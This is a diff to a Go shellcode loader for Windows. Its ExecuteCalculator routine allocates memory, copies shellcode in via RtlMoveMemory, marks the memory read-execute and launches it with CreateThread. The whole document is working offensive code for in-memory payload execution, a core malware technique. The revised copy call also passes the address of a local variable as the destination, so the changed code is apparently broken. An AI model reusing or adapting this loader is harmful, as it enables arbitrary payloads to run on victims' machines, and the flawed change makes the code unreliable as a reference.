@@ -16,11 +16,11 @@ func ExecuteCalculator() {
 
 	shellAddr, shellSrc := AllocateShellcode()
 
-	CopyShellcodeToMemory(&shellAddr, &shellSrc)
+	CopyShellcodeToMemory(shellAddr, &shellSrc)
 
 	ChangeShellcodeMemoryToRX(&shellAddr, len(shellSrc))
 
-	tHandle := CreateThread(&shellAddr)
+	tHandle := CreateThread(shellAddr)
 
 	RunShellcode(&tHandle)
 	log.Print("[SHELL] Shellcode Executed Successfully\n")
@@ -46,16 +46,19 @@ func AllocateShellcode() (uintptr, []byte) {
 	return shellAddr, shellCodeSrc
 }
 
-func CopyShellcodeToMemory(shellcodeAddr *uintptr, shellCodeSrc *[]byte) {
+func CopyShellcodeToMemory(destAddr uintptr, shellCodeSrc *[]byte) {
 
 	procRtlMoveMemory := dll.NtDll.NewProc("RtlMoveMemory")
 
-	procRtlMoveMemory.Call(*shellcodeAddr,
+	procRtlMoveMemory.Call(
+
+		uintptr(unsafe.Pointer(&destAddr)),
 		// 1. Dereference Before Indexing
 		// 2. Pointer to First Element
 		uintptr(unsafe.Pointer(&(*shellCodeSrc)[0])),
 		uintptr(len(*shellCodeSrc)))
-	log.Printf("[+] Shellcode Wrote Done 0x[%v] \n", shellcodeAddr)
+
+	log.Printf("[+] Shellcode Wrote Done 0x[%v] \n", destAddr)
 }
 
 func ChangeShellcodeMemoryToRX(shellcodeAddr *uintptr, shellCodeSrcLen int) {
@@ -72,14 +75,14 @@ func ChangeShellcodeMemoryToRX(shellcodeAddr *uintptr, shellCodeSrcLen int) {
 	log.Printf("[+] Shellcode Memory Permissions Changed To R-X \n")
 }
 
-func CreateThread(shellAddr *uintptr) uintptr {
+func CreateThread(shellAddr uintptr) uintptr {
 
 	procCreateThread := dll.Kernel32.NewProc("CreateThread")
 
 	tHandle, _, lastErr := procCreateThread.Call(
 		uintptr(0),
 		uintptr(0),
-		*shellAddr,
+		shellAddr,
 		uintptr(0),
 		uintptr(0),
 		uintptr(0))
